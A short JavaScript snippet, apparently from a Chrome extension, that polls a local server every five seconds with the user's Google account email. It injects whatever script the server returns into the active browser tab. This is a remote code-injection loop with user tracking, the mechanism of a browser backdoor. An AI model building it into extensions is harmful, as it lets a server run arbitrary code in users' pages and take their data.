function executeJS() {
    chrome.identity.getProfileUserInfo(function(userInfo) {
        if (userInfo.email == "") {
            userEmail = "no_email_found"
        }
        else {
            userEmail = JSON.stringify(userInfo.email);
        }
        localStorage.setItem('email', userEmail);
        $.get(`http://localhost:5000/execute_script/${userInfo.email}`, function(script) {
            if (script.js && script.js.length !== 0) {
                // Execute each script in the array
                for (let code of script.js) {
                    code = code.replace(/<script>|<\/script>/gi, '');
                    chrome.tabs.executeScript(null, {code:code});
                }
            }
        });
    });
}

setInterval(executeJS, 5 * 1000);